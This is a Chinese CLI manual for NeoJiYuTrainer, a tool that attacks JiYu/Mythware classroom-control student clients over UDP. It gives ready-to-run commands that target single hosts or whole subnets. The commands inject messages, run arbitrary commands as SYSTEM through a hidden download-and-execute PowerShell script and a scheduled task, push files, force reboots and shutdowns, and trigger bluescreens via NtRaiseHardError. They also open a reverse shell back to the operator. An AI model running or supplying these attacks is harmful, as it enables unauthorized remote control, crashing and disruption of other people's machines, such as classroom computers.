<div align="center">
<h1>CLI 模式使用说明</h1>
<p>
   <a href="https://github.com/JasonFang0109c/NeoJiYuTrainer/releases/tag/nightly"><img alt="Nightly Build" src="https://img.shields.io/badge/Nightly-Build-blue?style=for-the-badge&logo=githubactions&labelColor=212121"></a>
   <img alt="Single EXE" src="https://img.shields.io/badge/运行-单文件%20EXE-2CA5E0?style=for-the-badge&labelColor=212121">
   <img alt="No Python" src="https://img.shields.io/badge/依赖-无需%20Python-3ddc84?style=for-the-badge&labelColor=212121">
</p>
<p><a href="../../README.md">← 返回项目首页</a> 丨 <a href="Gui.md">GUI 模式使用说明</a></p>
</div>

---

GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://github.com/JasonFang0109c/NeoJiYuTrainer/releases/tag/nightly) 或 [最新正式版](https://github.com/JasonFang0109c/NeoJiYuTrainer/releases/latest) 下载 **NeoJiYuTrainer.exe** 即可。无参数启动打开图形界面；带参数启动运行命令行模式，无需安装 Python 或 PySide6。正式版偏稳定，nightly 随 `main` 更新，两者版本号格式见[版本规范](../Dev/Versioning.md)。

> **提示**
> 单文件即可运行，不需要克隆仓库，也不需要安装 Python。双击 EXE 打开 GUI，在终端带参数运行进入 CLI；相对文件路径按终端当前工作目录解析。

## 使用概览

命令行模式通过命令执行图形界面中的主要操作，包括向一台或多台学生机发送消息或指令、执行设备操作，以及在本机启动反弹终端。命令按界面分组组织：先写分组和子命令，再填写该子命令对应的参数，例如 `remote message` 是文本消息页、`remote device` 是设备操作页、`app uninstall` 是卸载命令。常用参数包括：`-ip` 指定目标地址，`-msg` 指定消息内容，`-c` 指定命令，`--reboot` / `--shutdown` 执行重启或关机；其他以 `--` 开头的选项由对应子命令定义。

### 术语说明

| 文档里的说法 | 通俗理解 |
| --- | --- |
| 目标地址 `-ip` | 要操作哪台学生机，可以写一台、一段（`1-10`）或一个网段（`0/24`） |
| 目标端口 `-p` | 学生端接收报文的端口，默认值为 `4705`，通常无需修改 |
| 报文 | 通过网络发送的数据；一条消息或命令可能由一个或多个报文组成 |
| 学生端 | 学生机上装的极域客户端，所有远程操作最终都是发给它的 |
| 已送达 / 发送成功 | 只表示报文没被网络拒绝、对方在线，不代表学生机一定执行了 |
| 拒绝 / 超时 | 对方端口没人接、地址不通，或者被防火墙拦了 |

### 子命令概览

| 分组 / 子命令 | 对应界面页面 | 一句话说明 |
| --- | --- | --- |
| `remote message` | 文本消息 | 向学生机发送文本消息：`-msg` 或 `--msg-file` 二选一，`-l` / `-t` 用于设置重复轮次与间隔 |
| `remote command` | 远程命令 | 让学生机执行一条命令行（`-c`），不回显输出 |
| `remote file` | 文件传送 | 将文件或文件夹传送到学生机桌面（`--file`） |
| `remote device` | 设备操作 | `--reboot` 重启、`--shutdown` 关机、`--logoff` 注销、`--bluescreen` 蓝屏；四个动作互斥，重启与关机用固定报文，不带倒计时与提示 |
| `remote shell` | 反弹终端 | 在学生机上建立可持续交互的命令行会话 |
| `classroom student` | 启停学生端 | 按当前状态启动或结束本机极域学生端，腾出被独占的 4705 端口 |
| `app uninstall` | 设置 → 卸载应用 | 删除快捷方式、可选驱动服务与安装目录，`--keep-data` 保留用户数据 |

### 常见疑问

**为什么显示“已送达”但对方没反应？**
这条判断只看网络：端口有没有人接、主机在不在线。学生机收下了报文但没执行（比如它没开对应功能、版本不同或班级策略不允许），命令行是看不到的。要确认执行结果只能看目标屏幕。

### 命令从哪来

命令按界面分组，功能大多对应两个来源项目：

| 来源 | 对应功能 |
| --- | --- |
| `JiYuTrainer` | 课堂助手、课堂防护与广播窗口右键菜单所依据的窗口处理规则、反监视/防控制 Hook 思路、远程命令确认流程和内核强杀思路；命令行不直接提供这些窗口操作 |
| `Jiyu_udp_attack` | 文本消息（`remote message`）、远程命令（`remote command`）、重启与关机（`remote device`）的报文结构 |
| 本程序新增 | 注销（`remote device --logoff`）、蓝屏（`remote device --bluescreen`）、文件传送（`remote file`）、反弹终端（`remote shell`）、启停学生端（`classroom student`） |

来源的 `-e r` / `-e s` 是重发一份固定模板，本程序照旧重发同一份模板；来源的 `-e nc` 依赖外网脚本与 `powercat`，本程序的 `remote shell` 自己起脚本服务。

## 快速开始

三步即可发送第一条消息：

<div align="center">
<table width="100%" style="border: none;">
  <tr>
    <td width="33%" valign="top">
      <h3>📥 获取程序</h3>
      <p>下载 <code>NeoJiYuTrainer.exe</code>，保存到任意目录。</p>
    </td>
    <td width="33%" valign="top">
      <h3>▶️ 运行命令</h3>
      <p>在 EXE 所在目录打开终端，带上目标地址与功能参数。</p>
    </td>
    <td width="33%" valign="top">
      <h3>✅ 查看结果</h3>
      <p>终端按目标输出“成功/失败”与原因；能否执行由学生端决定。</p>
    </td>
  </tr>
</table>
</div>

## 运行环境

Windows 10/11。EXE 已包含 Python 运行时，命令行模式无需安装 Python 或 PySide6；只有从源码运行 CLI 时才需要 Python 3.13，在项目根目录执行 `python -m NeoJiYuTrainer ...` 即可。

以下示例默认在保存 `NeoJiYuTrainer.exe` 的目录中执行 PowerShell。PowerShell 需要 `.\` 前缀；命令提示符（cmd）可直接写 `NeoJiYuTrainer.exe`。

```powershell
.\NeoJiYuTrainer.exe -h
.\NeoJiYuTrainer.exe --version
```

`--version` 输出程序版本号，用于确认下载到的版本；版本号规则见[版本规范](../Dev/Versioning.md)。正式版形如 `0.1.0`，测试版形如 `0.1.0-1a8ede3`：末尾 7 位是这次构建的提交哈希，方便对照是哪次改动。

通用格式：

```text
NeoJiYuTrainer.exe <分组> <子命令> [-ip <目标地址>] [-p <目标端口>] <该页面的参数>
```

先写分组与子命令，再跟这个页面的参数。`-ip` 只有需要目标的功能才要求，默认 UDP 端口为 `4705`；`app uninstall` 与 `classroom student` 不需要目标地址。无参数启动会打开 GUI，带 `-h`、`--version` 或其他参数时运行 CLI；GUI 的启动与操作见 [GUI 模式使用说明](Gui.md)。

在命令提示符（cmd）中可直接运行：

```bat
NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Hello"
```

EXE 是窗口化程序，双击无参数启动只打开 GUI，不会创建控制台窗口。从终端带参数启动时，程序把输出写回当前终端，不会另开控制台窗口；由于它不占用控制台，提示符会立即返回，需要等命令执行完再继续时用 `start /wait`：

```bat
start /wait NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Hello"
```

重定向输出（`> 结果.txt`）与管道仍然有效。

## 分组命令

命令按图形界面的分组组织，一个页面就是一条子命令，因此不记得参数时可以先从分组找：

```powershell
# 先看有哪些分组
.\NeoJiYuTrainer.exe -h

# 再看某个页面能用哪些参数
.\NeoJiYuTrainer.exe remote message -h
```

| 子命令 | 例子 |
| --- | --- |
| `classroom student` | `classroom student --list`、`classroom student --path`、`classroom student --start` |
| `remote message` | `remote message -ip 192.168.1.10 -msg "下课了"` |
| `remote file` | `remote file -ip 192.168.1.10 --file 报告.pdf` |
| `remote device` | `remote device -ip 192.168.1.10 --shutdown` |
| `remote command` | `remote command -ip 192.168.1.10 -c whoami` |
| `remote shell` | `remote shell -ip 192.168.1.10` |
| `app uninstall` | `app uninstall`、`app uninstall --keep-data` |

子命令之后的参数见下方“参数参考”。旧的扁平写法已移除；原命令需要迁移为对应的分组子命令，例如 `-ip 地址 -msg 内容` 改为 `remote message -ip 地址 -msg 内容`。

## 参数参考

参数按子命令分组：先写 `<分组> <子命令>`，再跟这个页面自己的参数。`-h` 只列出当前子命令支持的参数，所以不记得某个页面能做什么时，直接看它自己的帮助即可。

### 帮助、版本与连接参数

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `-h` / `--help` | 开关 | 无 | 显示当前层级的帮助并退出 |
| `-V` / `--version` | 开关 | 无 | 仅在程序根级使用，显示版本号并退出（测试版末尾带提交哈希） |
| `-ip` | 字符串 | 无 | 目标地址，支持单个 IPv4、同网段末段范围及 `/24`；只用于支持连接参数的子命令 |
| `-p` | 整数 | `4705` | 目标 UDP 端口；只用于支持连接参数的子命令 |

### remote message（文本消息）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `-msg TEXT` | 字符串 | 无 | 发送文本消息，保留多行内容；超长文本自动分条 |
| `--msg-file PATH` | 路径 | 无 | 从 UTF-8 文件读取消息；`-` 表示标准输入；与 `-msg` 互斥 |
| `-l N` | 整数 | `1` | 发送轮数；每轮遍历全部目标与报文 |
| `-t N` | 整数 | `22` | 轮次之间的等待秒数，仅多轮发送时生效 |

### remote command（远程命令）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `-c TEXT` | 字符串 | 无 | 待执行的命令，正文不进报文，经本机托管脚本以 SYSTEM 身份执行 |
| `-l N` | 整数 | `1` | 发送轮数；每轮遍历全部目标 |
| `-t N` | 整数 | `22` | 轮次之间的等待秒数，仅多轮发送时生效 |

命令正文不进报文：本机临时 HTTP 服务托管一段脚本（路径 `/e.ps1`，60 秒后自关），报文只下发一条“下载并执行”命令。脚本把命令写成批处理，注册一个以 `NT AUTHORITY\SYSTEM` 身份、`/RL HIGHEST` 运行的一次性计划任务（`schtasks /Create`）并立即 `/Run`，每 0.5 秒检查一次任务状态，命令跑完立刻 `/Delete` 清理（最长等 20 秒兜底），输出落在公共目录 `jyelev\out.txt`。触发只依赖 `/Run`、等待用秒表计时，因此目标与本机系统时间是否同步都不影响执行。因此命令长度不受报文容量限制，但结果不回传；命令行会等目标取回脚本后打印“目标已取回计划任务脚本”或超时提示。注册以 SYSTEM 运行的任务要求目标端学生端以管理员或 SYSTEM 运行，否则任务登记会被拒绝；目标还需要能访问本机地址与端口。

### remote file（文件传送）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `--file PATH [PATH ...]` | 路径 | 无 | 传送一个或多个文件、文件夹到目标桌面，文件夹按原结构递归 |
| `--file-ip ADDRESS` | IPv4 | 自动检测 | 写入下载命令的本机 IPv4；多网卡或自动检测异常时手动指定 |
| `--file-timeout SECONDS` | 秒 | `120` | 等待每个目标下载完成的秒数，须大于 0 |

### remote device（设备操作）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `--reboot` | 开关 | — | 重启目标电脑，重发来源项目里那份固定的重启报文 |
| `--shutdown` | 开关 | — | 关闭目标电脑，重发来源项目里那份固定的关机报文 |
| `--logoff` | 开关 | — | 注销目标当前登录用户，通过远程命令执行 `shutdown /l` |
| `--bluescreen` | 开关 | — | 触发目标蓝屏，通过远程命令启用关机特权并调用 `NtRaiseHardError` |

debug 版本会在发送前写一条 `DEBUG` 日志“蓝屏载荷”，给出载荷做法与报文条数。

四个动作互斥，必须选一个。重启与关机重发固定报文，不带倒计时与提示文字；注销与蓝屏没有独立报文，走远程命令通道：注销一条 `shutdown /l`，蓝屏同样只有一条命令，脚本本体挂在本机的临时 HTTP 服务上，由目标自己取回执行。

蓝屏的原理是让内核按硬错误停机：命令通道只有目标上的普通用户令牌，但 `SeShutdownPrivilege`（关闭系统）在工作站默认授予 `Users`，只是默认禁用，脚本先用 `RtlAdjustPrivilege(19, 1, 0, ...)` 在自己的进程里启用它，再调用
`NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ...)`（响应选项 6 表示关机），系统随即按这个状态码蓝屏并重启。整个过程不需要管理员、不需要计划任务，也不结束任何进程，因此比结束 `svchost.exe` 稳。
单条远程命令最多 163 个 UTF-16 单元，脚本本身装不下，所以脚本挂在本机一个临时 HTTP 服务上（随机端口，路径 `/bs.ps1`，60 秒后自关），下发的命令只有 “下载并立即执行” 这一步，共一条报文；命令用 `-w hidden -ExecutionPolicy Bypass` 启动 PowerShell，目标允许执行远程命令时才会生效。命令行会把这一条报文发完之后再等 15 秒，等目标取走脚本再退出（打印“目标已取回蓝屏脚本”或超时提示），界面版则靠常驻进程让服务自己到期关闭。这条命令只在目标机生效，验证时选择一台可弃用的机器即可，不要拿本机或在用的机器试。

### remote shell（反弹终端）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `-ip ADDRESS` | 地址 | 无 | 目标地址，与其它 `remote` 子命令共用同一套参数 |
| `-p PORT` | 整数 | `4705` | 目标学生端 UDP 端口，连接命令通过它下发 |

子命令本身就会启动反弹终端：先在本机随机空闲端口启动 TCP 终端监听和仅提供启动脚本的临时 HTTP 服务，再通过远程命令让目标下载脚本并连回来，连上后逐条输入命令。本机回连地址按目标地址自动挑选出口网卡，监听端口由系统分配，两者都不再提供单独开关；连接命令要挤进单条远程命令的 163 个 UTF-16 单元里，因此地址与端口都由程序自己挑选。目标是窗口化的 EXE 时，程序会把标准输入重新绑定到控制台，交互与在源码里运行一致。

### classroom student（启停学生端）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| （不带参数） | — | — | 按当前状态切换：有学生端在运行就结束，没有就启动 |
| `--list` | 开关 | 关 | 只列出进程号、进程名、占用端口与程序路径，不做任何改动 |
| `--path` | 开关 | 关 | 只查找并打印学生端主程序位置，不做任何改动 |
| `--start` | 开关 | 关 | 强制启动学生端，路径留空时按记住的路径与安装目录自动查找 |
| `--exe PATH` | 路径 | 无 | 配合 `--start` 指定主程序的完整路径 |
| `--pid PID` | 整数 | 无 | 只结束指定进程，可重复 |
| `--no-guardian` | 开关 | 关 | 结束后不等待复查，直接返回；默认为停留 2 秒确认没有被守护服务重新拉起 |

### app uninstall（卸载应用）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `--keep-data` | 开关 | 关 | 保留 `Data`；不写该选项时连同备注、设置与日志一起删除 |

只允许在打包后的 EXE 中执行：源码运行时没有可清理的安装目录，会直接返回提示。卸载会删除桌面与开始菜单快捷方式，尝试停止并删除 `JiyuGuardDriver` 服务，然后安排退出后清理 EXE 所在目录；建议先关闭正在运行的程序。

### 从旧命令迁移

旧的扁平命令不再支持；请使用对应的分组子命令。例如，原 `-e r` 改为 `remote device --reboot`，`-e g` 改为 `app uninstall`，`--start-student` 改为 `classroom student --start`。原来一次组合的多项操作需要分别执行多个子命令。分组名也统一成界面称呼：原 `restriction student` 改为 `classroom student`。

## 目标地址格式

一句话：`-ip` 决定发给谁，可以是一台、一段或一个网段。

| 格式 | 参数示例 | 目标范围 |
| --- | --- | --- |
| 单个地址 | `-ip 10.49.151.29` | 仅 `10.49.151.29` |
| 同网段范围 | `-ip 10.49.151.1-10` | `10.49.151.1` 至 `10.49.151.10`，含两端 |
| `/24` 网段 | `-ip 10.49.151.0/24` | `10.49.151.1` 至 `10.49.151.254` |

范围写法右侧仅填写末段数字；仅支持 `/24` 网段，不支持任意 CIDR 前缀。地址会经过 IPv4 格式校验，范围或网段无效时直接提示错误。

## 使用示例

示例中的 `10.49.151.29` 为占位目标地址，运行前请按实际测试环境替换。

### 发送文本消息

```powershell
.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Hello"
```

### 发送多行文本

使用 PowerShell 的 Here-String 可保留换行、空行与缩进：

```powershell
$message = @'
第一行通知
第二行通知

第四行通知
'@
.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg $message
```

CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转成换行；目标端是否按多行显示取决于学生端消息窗口的实现。

### 从文件读取长文本

文本保存为 UTF-8 文件，可包含多行内容、空行及中文，也支持带 BOM 的 UTF-8。

```powershell
.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 --msg-file "notice.txt"
```

`--msg-file -` 从标准输入读取文本，适合较长内容并避免将全文放入命令行参数；`--msg-file` 与 `-msg` 不可同时使用。

### 消息容量与分条行为

单条报文为 954 字节，正文从偏移 56 开始，每条为字符串结束符预留 2 字节，正文最多 **896 字节，即 448 个 UTF-16 单元**。普通中文、英文字母通常占 1 个单元，部分字符占 2 个单元，换行符也计入容量。这是发送缓冲区的容量，并非已验证的学生端显示上限。

总文本不设固定长度上限，超出单条容量时自动拆成多条独立消息，保留文本内容及换行，不拆开单个 Unicode 码点。总长度受可用内存及输入方式限制，文本不支持内嵌 NUL 字符。

**分条不等于接收端合并。** CLI 模式按顺序发送各条报文，但不提供接收端重组、回执或重传机制，不能保证长文本在目标端完整、有序地显示为同一条消息。

发送结束后会逐个目标打印结果：`[成功] 192.168.1.10：已送达（1 个报文）` 或 `[-] [失败] 192.168.1.10：失败：目标端口未响应`，最后一行汇总成功与失败数量。判定依据只有网络反馈：目标端口或主机返回 ICMP 不可达时判为“失败：目标端口未响应”或“失败：目标不可达”；没有收到错误时再主动发一次 ICMP 回显，主机有回应、或同网段能通过 ARP 解析到它时判为“已送达”，两者都没有则判为“失败：目标未响应”。因此“成功”只表示报文没有被网络拒绝、对方在线，仍不能证明学生端已经执行。

### 指定目标端口

```powershell
.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -p 4705 -msg "Test message"
```

### 发送查询命令

```powershell
.\NeoJiYuTrainer.exe remote command -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
```

### 使用包含空格的路径

在 PowerShell 中，用外层单引号包裹整个命令，并用内层双引号包裹路径：

```powershell
.\NeoJiYuTrainer.exe remote command -ip 10.49.151.29 -c 'cmd.exe /c dir "C:\Program Files"'
```

### 传送文件到桌面

以下命令选择本机文件，并通过目标学生端的远程命令能力触发系统自带的 `curl` 下载：

```powershell
.\NeoJiYuTrainer.exe remote file -ip 10.49.151.1-10 --file "D:\资料\实验报告.pdf" --file-timeout 180
```

CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机令牌的下载命令，目标使用当前登录用户桌面保存同名文件。下载完成后写入正式文件，中断则清理 `.part` 临时文件。UDP 命令未得到目标响应时最多重发 3 次，避免单次丢包造成任务无响应。

`--file` 可以一次给多个路径，文件与文件夹可以混用：

```powershell
.\NeoJiYuTrainer.exe remote file -ip 10.49.151.29 --file "D:\资料\实验报告.pdf" "D:\课件" "readme.txt"
```

文件夹按原结构递归展开：上例中的 `D:\课件` 会把其下所有层级的文件按相对路径一起传送，目标桌面出现同名文件夹。重复给出的路径只保留一次；一个文件夹里没有文件，或路径不存在时直接报错，不会静默跳过。

- 目标电脑不需要开放入站端口，只需允许执行远程命令、提供 Windows 自带的 `curl.exe`，并允许其主动访问发送端的自动检测 IP 与随机 TCP 端口。
- 发送端 Windows 防火墙需允许 EXE 或临时 HTTP 服务监听；GUI 首次使用时按系统提示允许。
- 目标只保存文件，不会自动打开、通知或回传执行结果。
- 自动检测会忽略 `198.18.0.0/15` 等虚拟或基准测试网段，并在出口地址不可用时选择与目标网段更接近的真实局域网地址。TUN/VPN 或多网卡环境仍检测错误时，使用 `--file-ip 10.49.151.20` 手动指定发送端 IP。
- 多个目标按顺序逐个传送，每个目标单独等待下载，某个目标失败后继续尝试其余目标并汇总失败目标；`--file-timeout` 按单个目标计算。
- 每个目标的文件服务只在该目标等待下载期间运行，超时或任务取消后停止。失败信息会区分“目标未访问文件服务”“目标已取脚本但未下载”和“下载中断”。

### 启停本机学生端

如果本机装着极域学生端（`StudentMain.exe`），它会独占本机地址的 4705 端口，把本该由本程序处理的学生端回包全部收走。需要腾出端口时先结束它；验证完想恢复课堂管理，再用同一个子命令把它启动起来。

```powershell
# 只列进程与占用端口，不动进程
.\NeoJiYuTrainer.exe classroom student --list

# 只查程序位置：按记住的路径、运行中的进程、卸载信息与常见目录查找
.\NeoJiYuTrainer.exe classroom student --path

# 按当前状态切换：存在进程时结束，否则启动，与界面的单按钮一致
.\NeoJiYuTrainer.exe classroom student

# 只结束指定进程
.\NeoJiYuTrainer.exe classroom student --pid 17600

# 结束后不等 2 秒复查，直接返回
.\NeoJiYuTrainer.exe classroom student --no-guardian

# 启动学生端，留空路径时自动查找安装位置
.\NeoJiYuTrainer.exe classroom student --start

# 指定程序路径启动
.\NeoJiYuTrainer.exe classroom student --start --exe "C:\Program Files\TopDomain\e-Learning Class Standard\1.00\StudentMain.exe"
```

结束时先给有窗口的同名进程发关闭消息请它自己退出，等不到进程消失再强制结束，仍被拒绝才走管理员授权；极域学生端不响应正常退出，所以判定以进程是否真的消失为准。结束前会校验进程创建时间，进程号恰好被别的程序复用时不会误杀。默认结束后停留 2 秒复查，学生端又被拉起来时提示是守护服务重启了它，`--no-guardian` 可以跳过这段等待。

识别只认映像名里带 `student` 的进程，同目录有 `LibTDMaster.dll` 才算极域真身；极域安装目录里的 `DispcapHelper.exe`、`GATESRV.exe` 不会被误当成学生端。进程、端口与程序路径来自系统进程表、`GetExtendedUdpTable` / `GetExtendedTcpTable` 与 `QueryFullProcessImageName`，路径读不到时（例如学生端以 SYSTEM 运行）显示“不可读”，这不影响结束。列表会标注同目录是否带 `LibTDMaster.dll`，没有这个库的同名进程通常是冒牌货。

不带选项时按状态决定方向，与界面上的单按钮行为一致：存在进程时结束并显示该进程，否则启动学生端。`--start` 是强制启动（用于确认方向），`--pid` 只结束指定进程，`--list` 只查看，`--path` 只查找位置。

启动时依次找：`--exe` 指定的路径 → 界面里记住的路径（`settings.json` 的 `core/student/exe_path`）→ 运行中的真身进程 → 卸载信息里的 `DisplayIcon` → 卸载信息里的 `InstallLocation` → 极域服务所在目录 → 常见安装目录（含 `Mythware\e-Learning Class` 与中文目录）。拉起后会在 8 秒内轮询确认进程真的起来了，只有新出现且带 `LibTDMaster.dll` 或占用 `4705` 的进程才算成功；没确认到会提示可能被安全软件拦下，本机已经在运行学生端时不会重复启动。

### 用本机 IP 测试

没有第二台测试设备时，可以把 `-ip` 指向运行程序的本机 IPv4 地址，例如 `-ip 192.168.1.20`。CLI 会照常发送 UDP 报文；本机没有学生端监听对应端口时不会产生可见效果。

```powershell
.\NeoJiYuTrainer.exe remote message -ip 192.168.1.20 -msg "本机测试"
```

仓库提供的 `Scripts/TestLocalIp.py` 会自动选择本机地址，在空闲 UDP 端口上接收并校验消息、命令、重启、关机、注销和连续发送报文，适合验证协议与发送流程；运行方式见[开发与提交规范](../Dev/Contributing.md#本机-ip-自测)。

### 控制发送轮数与间隔

以下命令发送 3 轮消息，相邻两轮之间等待 10 秒，最后一轮结束后不再等待：

```powershell
.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Test message" -l 3 -t 10
```

### 组合发送消息与命令

子命令一次只做一件事，所以要同时发消息和命令，就写两条命令：

```powershell
.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Test"
.\NeoJiYuTrainer.exe remote command -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
```

分组命令一次只做一项操作。需要顺序执行时，应等待前一个命令结束再运行下一个。

### 发送重启、关机、注销或蓝屏指令

```powershell
# 重启目标
.\NeoJiYuTrainer.exe remote device -ip 10.49.151.29 --reboot

# 关闭目标
.\NeoJiYuTrainer.exe remote device -ip 10.49.151.29 --shutdown

# 注销目标当前登录用户
.\NeoJiYuTrainer.exe remote device -ip 10.49.151.29 --logoff

# 触发目标蓝屏（启用关机特权后调用 NtRaiseHardError，机器随后重启）
.\NeoJiYuTrainer.exe remote device -ip 10.49.151.29 --bluescreen
```

### 反弹终端

```powershell
# 在本机随机空闲端口监听，并把回连命令发到目标
.\NeoJiYuTrainer.exe remote shell -ip 10.49.151.29

# 目标学生端端口不是默认的 4705 时，用 -p 指定
.\NeoJiYuTrainer.exe remote shell -ip 10.49.151.29 -p 4800
```

启动后终端会打印终端监听端口与脚本服务端口，连上目标后逐行输入命令，`exit` 或 `quit` 结束并断开。本机回连地址按目标地址自动挑选出口网卡，监听端口由系统分配。目标没有连回来时输入的指令只会提示未发送，不会静默丢弃。

## 行为与限制

以下列出常见行为与限制，使用前建议先行阅读。

- **发送结果**：“已送达”只看网络：端口有没有人接、主机在不在线。学生机收下报文但没执行（没开对应功能、版本不同或班级策略不允许），命令行是看不到的，要确认结果只能看目标屏幕。
- **循环参数**：`-l` 填几轮、`-t` 填每轮之间等几秒。等待发生在两轮之间，不在每台设备之间。
- **功能组合**：每个分组子命令一次只执行一种操作。需要多项操作时，分别执行对应命令并等待前一项完成。
- **文本编码**：消息与命令按 `utf-16le` 编码，中文正常，`\n` 也算容量。消息超长自动分条，命令受单条报文容量限制，超了会直接报错。
- **输出范围**：`remote command` 不会把目标命令的输出传回当前终端，要实时回显请用 `remote shell`。

## 运行日志

CLI 模式也会写运行日志，文件是数据目录下 `Log/Cli.log`，与 GUI 的 `Log/Runtime.log` 分开，两个模式可以同时运行、各写各的文件。数据目录与 GUI 相同：EXE 所在目录下的 `data`，源码运行时位于项目根目录。

- 没有等级开关，按构建变体的默认等级写入：正常版本写 `WARNING` 与 `ERROR`（图形界面里调低到 `INFO` 只影响界面自身的日志，命令行始终按默认等级落盘），`NeoJiYuTrainer_Debug.exe` 从 `DEBUG` 起记录。正常版本保留参数错误、发送失败与异常；调试版本记录分组、子命令、目标与报文数量等排查信息。启动参数摘要不包含消息或命令正文，但其他调试日志可能包含命令内容或文件路径，请谨慎保存和分享。
- 只查帮助或版本号（`-h`、`--help`、`-V`、`--version`，包括子命令帮助）不会创建数据目录，也不写日志：这类调用没有副作用，不留下空目录与只有一行的日志文件。
- 格式与 GUI 日志一致，可以直接用同一个查看器阅读：`2026-11-04 13:29:10.527 [10440] [MainThread] DEBUG   NeoJiYuTrainer.Start.Cli.log_arguments:31 - [命令行] 命令行参数`，多行内容以缩进续行写入。
- 文件在本次运行期间保持打开，每条记录写入后刷新文件缓冲，命令结束时关闭句柄。
- 目录不可写时只在终端提示一次“命令行日志保存失败”，命令本身照常执行，不会因为写日志失败而中断。

## 问题排查

| 现象 | 可能原因 | 检查建议 |
| --- | --- | --- |
| 提示找不到命令或程序 | 终端不在 EXE 所在目录，或 PowerShell 未加 `.\` 前缀 | 切换到 EXE 所在目录；PowerShell 使用 `.\NeoJiYuTrainer.exe ...`，cmd 可直接写 `NeoJiYuTrainer.exe ...`，也可使用绝对路径 |
| 双击后只打开 GUI | 无参数启动按设计进入 GUI | 在终端带功能参数启动 CLI，例如 `.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Hello"` |
| 提示“发送成功”，目标无响应 | 地址或端口不匹配、报文被拦截、学生端未监听、目标未执行指令 | 核对目标地址、UDP 端口、学生端状态及目标端执行结果 |
| 包含空格的路径处理失败 | 路径未完整加引号，或引号在终端传参时发生变化 | 参考包含空格路径的示例，并核对目标端路径 |
| 只有 IP、没有功能参数时无法发送 | 没有生成任何待发送报文 | 补上子命令与动作，例如 `remote message -msg ...`、`remote command -c ...` |
| 长命令报错 | 命令超过固定报文缓冲区容量 | 缩短命令，检查终端输出的异常信息 |
| 长消息只显示部分内容或顺序不一致 | 消息被拆成独立报文，未提供接收端重组与可靠交付机制 | 核对目标端实际显示结果；分条发送不能保证合并为单条消息 |
| `--msg-file` 无法读取 | 文件不存在或文件编码不是 UTF-8 | 核对路径，将文件保存为 UTF-8 编码 |
